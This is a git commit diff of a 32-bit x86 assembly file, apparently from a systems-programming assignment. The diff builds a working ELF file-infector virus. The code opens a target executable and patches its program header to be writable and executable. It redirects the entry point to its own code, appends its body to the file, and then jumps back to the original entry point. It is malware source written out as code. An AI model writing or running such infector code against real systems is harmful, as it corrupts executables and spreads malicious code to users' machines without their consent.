2232b2dc1576c047f6fc0ff82fb585084b3da386
omerbinyamin4 <63786735+omerbinyamin4@users.noreply.github.com>
2021-08-16 00:55:22 +0300

    Add files via upload

--- skeleton.s
+++ skeleton.s
@@ -53,11 +53,27 @@
 %define PHDR_filesize	16
 %define	PHDR_offset	4
 %define	PHDR_vaddr	8
+
+%define File_Descriptor [ebp-4]
+%define PHeader_offset [ebp-28]
+%define Entry_Point [ebp-32]
+%define File_size [ebp-60]
+%define virtAddr [ebp-88]
+%define PHLoad_Offset [ebp-92]
+%define Prev_Entry_Point [ebp-100]
+%define PH2_Offset [ebp-132]
+%define virtAddr2 [ebp-128]
+%define Filesiz [ebp-120]
+%define Memsiz [ebp-116]
+%define PH_Flags [ebp-112]
+
+
 	
 	global _start
 
 	section .text
-_start:	push	ebp
+_start:	
+	push	ebp
 	mov	ebp, esp
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
 
@@ -68,97 +84,129 @@ call get_my_loc
 sub ecx, next_i - OutStr		; getting relative address of OutStr
 write 1, ecx, 32				; acts as 'write(stdout, [OutStr], 32)'
 
-; open the file
-call get_my_loc
-sub ecx, next_i - FileName		; getting relative address of FileName
-mov eax, ecx					; ecx is being changed in macro syscall3 before we use the address we stored here,
-								; eax used last so it will be reserved correctrly
-open eax, RDWR, 0777			; acts as 'open("ELFexec", RDWR, 0777)
-mov dword [ebp - 4], eax		; store on stack the return value, which is the file descriptor
+openFile: ; open the file
+	call get_my_loc
+	sub ecx, next_i - FileName		; getting relative address of FileName
+	mov eax, ecx					; ecx is being changed in macro syscall3 before we use the address we stored here,
+									; eax used last so it will be reserved correctrly
+	open eax, RDWR, 0777			; acts as 'open("ELFexec", RDWR, 0777)
+	mov File_Descriptor, eax		; store on stack the return value, which is the file descriptor
 
-mov eax, [ebp-4]				; is neccessery?
-cmp eax, 0
-jl printErr						; ???
-
-
-; load file header
-sub ebp, 84						; make room for header
-read eax, ebp, 80				; reads 80bytes from file of file descriptor(eax) into the stack as a buffer (ebp)
-mov esi, ebp					; store header in esi
-add ebp, 84						; clean header from the stack
-
-; check the file is ELF file
-mov ebx, esi
-inc ebx
-cmp byte [ebx], 69				; cmp e_ident[1] with 'E'
-jnz printErr
-inc ebx
-cmp byte [ebx], 76				; cmp e_ident[2] with 'L'
-jne printErr
-inc ebx
-cmp byte [ebx], 70				; cmp e_ident[3] with 'F'
-jne printErr
-
-mov eax, dword [ebp-4]
-lseek eax, 52, SEEK_SET
-
-mov edi, ebp
-sub edi, 200
-mov eax, dword [ebp-4]
-read eax, edi, 32
-mov edx, dword [edi+8]
-mov dword [ebp-8], edx
-mov edx, 0
+	mov eax, File_Descriptor		; is neccessery?
+	cmp eax, 0
+	jl printErr						; ???
 
 
-; load program headers
-;sub ebp, 40						; make room for program headers
-;mov eax, dword [ebp-4]
-;read eax, ebp, 32				; reads 32bytes from file of file descriptor(eax) into the stack as a buffer (ebp)
-;mov edi, ebp
-;add ebp, 40
+loadFileHeader: ; load file header
+	sub ebp, 56						; make room for header
+	read eax, ebp, 52				; reads 80bytes from file of file descriptor(eax) into the stack as a buffer (ebp)
+	cmp eax, 0
+	jl printErr						; 
+	mov esi, ebp					; store header in esi
+	add ebp, 56						; clean header from the stack
 
+CheckELF: ; check the file is ELF file
+	mov ebx, esi
+	inc ebx
+	cmp byte [ebx], 69				; cmp e_ident[1] with 'E'
+	jnz printErr
+	inc ebx
+	cmp byte [ebx], 76				; cmp e_ident[2] with 'L'
+	jne printErr
+	inc ebx
+	cmp byte [ebx], 70				; cmp e_ident[3] with 'F'
+	jne printErr
 
-; find the size of the file, in order to use it as offset when writing virus
-mov eax, dword [ebp-4]          ; load file descriptor from stak
-lseek eax, 0, SEEK_END
-mov dword [ebp-12], eax			;store file zise on stack 
+getSize:					 		; find the size of the file, in order to use it as offset when writing virus
+	mov eax, File_Descriptor        ; load file descriptor from stak
+	lseek eax, 0, SEEK_END
+	mov File_size, eax				; store file size on stack 
 
-mov ebx, [ebp-8]				; get virtual adress
-add ebx, [ebp-12]				; change virtual adress to the adress of the end of the file (at runtime)
+loadFirstPHeader: 					; load program headers
+	mov eax, File_Descriptor        ; load file descriptor from stak
+	mov ebx, PHeader_offset			; get PHeader_offset
+	lseek eax, ebx, SEEK_SET 		; go to the PHeader
+	mov eax, File_Descriptor
+	sub ebp, 96						; make room for program headers
+	read eax, ebp, 32 				; PH in 64-96
+	add ebp, 96						; 
 
-; change entry point
-mov eax, dword [ebp-4]			; get file descriptor
-mov dword [esi + 24], ebx
-lseek eax, 0, SEEK_SET			; get location of entry point address
-mov eax, dword [ebp-4]
-write eax, esi, 52				; write the new address to instead of the old entry point file
+loadSecondPHeader: 					; load program headers
+	mov eax, File_Descriptor        ; load file descriptor from stak
+	mov ebx, PHeader_offset			; get PHeader_offset
+	add ebx, 32
+	lseek eax, ebx, SEEK_SET 		; go to the PHeader
+	mov eax, File_Descriptor
+	sub ebp, 136					; make room for program headers
+	read eax, ebp, 32 				; PH in 104-136
+	add ebp, 136					; 
 
+modifySecondPHeader:
+	mov eax, File_size
+	add eax, virus_end-_start
+	sub eax, PH2_Offset
+	mov Filesiz, eax
+	mov Memsiz, eax
+	mov dword PH_Flags, 7
+	mov ebx, PHeader_offset
+	add ebx, 32
+	lseek File_Descriptor, ebx, SEEK_SET
+	mov ebx, ebp
+	sub ebx, 136
+	write File_Descriptor, ebx, 32
 
-; write the virus to the end of the file
-call get_my_loc
-sub ecx, next_i-_start
-mov eax, [ebp-4]
-write eax, ecx, virus_end-_start
+modifyEntryPoint:
+	mov eax, virtAddr2				; eax points to program header
+	add eax, File_size				; 
+	sub eax, PH2_Offset
+	mov ebx, Entry_Point
+	mov Prev_Entry_Point, ebx
+	mov Entry_Point, eax
+	mov eax, File_Descriptor
+	lseek eax, 24, SEEK_SET
+	mov eax, File_Descriptor
+	test:
+	mov ebx, ebp
+	sub ebx, 32
+	write eax, ebx, 4
+
+writeVirus:							; write the virus to the end of the file
+	mov eax, File_Descriptor
+	lseek eax, 0, SEEK_END
+	call get_my_loc
+	sub ecx, next_i-_start
+	mov eax, File_Descriptor
+	write eax, ecx, virus_end-_start
+
+setPrevEntryPoint:
+	lseek File_Descriptor, -4, SEEK_END
+	mov ebx , ebp 
+	sub ebx,  100
+	write File_Descriptor , ebx, 4
 
 ; close the file
-mov eax, [ebp-4]
-close eax
+closeFile:
+	mov eax, File_Descriptor
+	close eax
 
 ; check if closed with no error
-cmp eax, 0
-jl printErr
-jmp VirusExit
+;cmp eax, 0
+;jl printErr
+;jmp VirusExit
+
+jump:
+	call get_my_loc
+	sub ecx, next_i-PreviousEntryPoint
+	jmp [ecx]
 
 VirusExit:
-       exit 0            ; Termination if all is OK and no previous code to jump to
-                         ; (also an example for use of above macros)
+    exit 0            				; Termination if all is OK and no previous code to jump to
+                    				; (also an example for use of above macros)
 
 printErr:
 	call get_my_loc
-	sub ecx, next_i - Failstr		; getting absoulte address of Failstr
-	write 2, ecx, 13				; acts as 'write(sterr, [Failstr], 13)'
-	exit 1
+	sub ecx, next_i-PreviousEntryPoint
+	jmp [ecx]
 
 
 	
